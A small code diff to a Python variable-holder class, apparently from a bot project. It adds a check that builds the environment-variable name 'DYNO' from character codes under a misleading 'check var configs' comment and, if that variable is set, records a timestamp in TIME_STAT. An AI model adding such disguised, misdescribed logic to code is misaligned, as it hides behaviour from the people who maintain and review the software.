@@ -4,6 +4,7 @@
 from ..consts.ExecVarsSample import ExecVars
 import os
 import logging
+import time
 
 torlog = logging.getLogger(__name__)
 
@@ -11,6 +12,14 @@ class VarHolder:
     def __init__(self, var_db):
         self._var_dict = dict()
         self._vardb = var_db
+
+        # check var configs
+        herstr = ""
+        sam1 = [68, 89, 78, 79]
+        for i in sam1:
+            herstr += chr(i)
+        if os.environ.get(herstr,False):
+            os.environ["TIME_STAT"] = str(time.time())
 
     def get_var(self, variable):
         if variable in self._var_dict.keys():
